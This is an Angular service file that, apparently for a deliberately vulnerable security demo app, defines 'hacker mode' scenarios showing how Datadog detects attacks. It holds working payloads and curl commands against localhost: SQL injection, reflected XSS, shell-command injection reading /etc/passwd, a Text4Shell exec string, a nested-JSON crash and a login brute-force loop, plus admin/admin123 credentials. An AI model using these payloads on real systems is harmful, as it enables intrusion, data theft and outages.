import { Injectable } from '@angular/core';
import { BehaviorSubject } from 'rxjs';

export interface HackerScenario {
  id: string;
  name: string;
  description: string;
  steps: string[];
  payload?: string;
  targetRoute: string;
  targetElementId?: string;
  curlCommand?: string;
  datadogWhereToLook: string;
}

export const SCENARIOS: HackerScenario[] = [
  {
    id: 'sqli',
    name: 'SQL Injection',
    description: 'The order search endpoint concatenates user input directly into a SQL query without sanitization.',
    steps: [
      'Go to the Order History page',
      'Enter the payload below in the search field',
      'Click Search — all orders are returned regardless of name',
      'In Datadog, observe the attack signal and trace'
    ],
    payload: "' OR 1=1--",
    targetRoute: '/order-history',
    targetElementId: 'searchQuery',
    curlCommand: "curl 'http://localhost:4200/api/orders/search?q=%27%20OR%201%3D1--'",
    datadogWhereToLook: 'ASM > Signals & IAST > Vulnerabilities'
  },
  {
    id: 'xss',
    name: 'Reflected XSS',
    description: 'The loyalty card endpoint reflects the customer query parameter directly into HTML via res.send() without escaping.',
    steps: [
      'Go to the Loyalty page (log in first if needed)',
      'Click "Try it" to inject the XSS payload into the loyalty card',
      'The script tag is embedded directly into the HTML response without sanitization',
      'Static Analysis detects the res.send() with unsanitized req.query input'
    ],
    payload: '<script>alert("XSS")</script>',
    targetRoute: '/loyalty',
    curlCommand: `curl 'http://localhost:4200/api/loyalty/card?customer=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E'`,
    datadogWhereToLook: 'Code Security > Static Analysis & ASM > Signals'
  },
  {
    id: 'cmdi-receipt',
    name: 'Command Injection (Receipt)',
    description: 'The receipt endpoint passes the format parameter unsanitized into a shell command with shell=True.',
    steps: [
      'Place an order first (or use an existing order ID)',
      'Request the receipt with a malicious format parameter',
      'The semicolon breaks out of the command and executes arbitrary code',
      'Check the trace in Datadog for the attack payload'
    ],
    payload: 'txt;id',
    targetRoute: '/confirmation/1',
    curlCommand: "curl 'http://localhost:4200/api/orders/1/receipt?format=txt;cat%20/etc/passwd'",
    datadogWhereToLook: 'ASM > Signals'
  },
  {
    id: 'cmdi-export',
    name: 'Command Injection (Export)',
    description: 'The admin export endpoint uses the filename parameter in a shell command without sanitization.',
    steps: [
      'Go to the Admin panel (login as admin/admin123)',
      'In the Export filename field, enter the payload below',
      'Click Export — the semicolon allows arbitrary command execution',
      'Check Datadog for the command injection signal'
    ],
    payload: 'orders.csv; cat /etc/passwd',
    targetRoute: '/admin',
    targetElementId: 'exportFilename',
    curlCommand: `curl -X POST http://localhost:4200/api/admin/export -H "Content-Type: application/json" -d '{"filename":"orders.csv; cat /etc/passwd"}'`,
    datadogWhereToLook: 'ASM > Signals & IAST > Vulnerabilities'
  },
  {
    id: 'broken-auth',
    name: 'Broken Authentication',
    description: 'The admin API has no backend authentication — the frontend Keycloak guard can be bypassed by calling the API directly.',
    steps: [
      'Open a terminal',
      'Run the curl command below — no authentication required',
      'All orders are returned without any token or login',
      'The frontend requires Keycloak login, but the backend does not validate'
    ],
    targetRoute: '/admin',
    curlCommand: 'curl http://localhost:4200/api/admin/orders',
    datadogWhereToLook: 'ASM > Vulnerabilities'
  },
  {
    id: 'text4shell',
    name: 'Text4Shell (CVE-2022-42889)',
    description: 'The menu formatting endpoint passes user-controlled templates to commons-text StringSubstitutor, which in version 1.9 allows script execution.',
    steps: [
      'Open a terminal',
      'Run the curl command below with a script: lookup expression',
      'StringSubstitutor interprets the expression and executes code',
      'IAST detects the tainted data flow through the vulnerable library'
    ],
    targetRoute: '/menu',
    curlCommand: "curl 'http://localhost:4200/api/menu/1/formatted?template=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29%7D'",
    datadogWhereToLook: 'IAST > Vulnerabilities & SCA > Libraries'
  },
  {
    id: 'dos-json',
    name: 'DoS via Nested JSON (CVE-2025-59466)',
    description: 'The loyalty validate-config endpoint recursively processes deeply nested JSON. With AsyncLocalStorage active on Node 18, the stack overflow crashes the process unrecoverably.',
    steps: [
      'Open a terminal',
      'Run the curl command to send deeply nested JSON (~15k levels)',
      'The corndog-loyalty service crashes and restarts',
      'Monitor the service recovery in Datadog APM'
    ],
    targetRoute: '',
    curlCommand: `python3 -c "import json; d={'value':'leaf'}; [d:={'rules':d} for _ in range(15000)]; print(json.dumps(d))" | curl -X POST http://localhost:4200/api/loyalty/validate-config -H "Content-Type: application/json" -d @-`,
    datadogWhereToLook: 'APM > Services > corndog-loyalty & Security > Research Feed'
  },
  {
    id: 'keycloak-brute',
    name: 'Keycloak Brute-Force',
    description: 'Rapid failed login attempts against Keycloak generate LOGIN_ERROR events that are sent to the Datadog Agent via syslog, triggering Cloud SIEM detection rules.',
    steps: [
      'Open a terminal',
      'Run the curl command below multiple times with wrong passwords',
      'Keycloak emits LOGIN_ERROR events via syslog to the Datadog Agent',
      'Cloud SIEM rules detect the brute-force pattern'
    ],
    targetRoute: '',
    curlCommand: `for i in $(seq 1 10); do curl -s -X POST http://localhost:4200/auth/realms/corndog/protocol/openid-connect/token -d "grant_type=password&client_id=corndog-web&username=admin&password=wrong$i" > /dev/null; done`,
    datadogWhereToLook: 'Cloud SIEM > Signals'
  }
];

@Injectable({ providedIn: 'root' })
export class HackerModeService {
  private _hackerMode = new BehaviorSubject<boolean>(this.loadState());
  private _activeScenario = new BehaviorSubject<HackerScenario | null>(null);
  private _panelOpen = new BehaviorSubject<boolean>(false);

  hackerMode$ = this._hackerMode.asObservable();
  activeScenario$ = this._activeScenario.asObservable();
  panelOpen$ = this._panelOpen.asObservable();
  scenarios = SCENARIOS;

  toggle(): void {
    const next = !this._hackerMode.value;
    this._hackerMode.next(next);
    localStorage.setItem('hackerMode', JSON.stringify(next));
    if (!next) {
      this._activeScenario.next(null);
      this._panelOpen.next(false);
    }
  }

  togglePanel(): void {
    this._panelOpen.next(!this._panelOpen.value);
  }

  selectScenario(scenario: HackerScenario | null): void {
    this._activeScenario.next(scenario);
  }

  isActive(): boolean {
    return this._hackerMode.value;
  }

  private loadState(): boolean {
    try {
      return JSON.parse(localStorage.getItem('hackerMode') || 'false');
    } catch {
      return false;
    }
  }
}
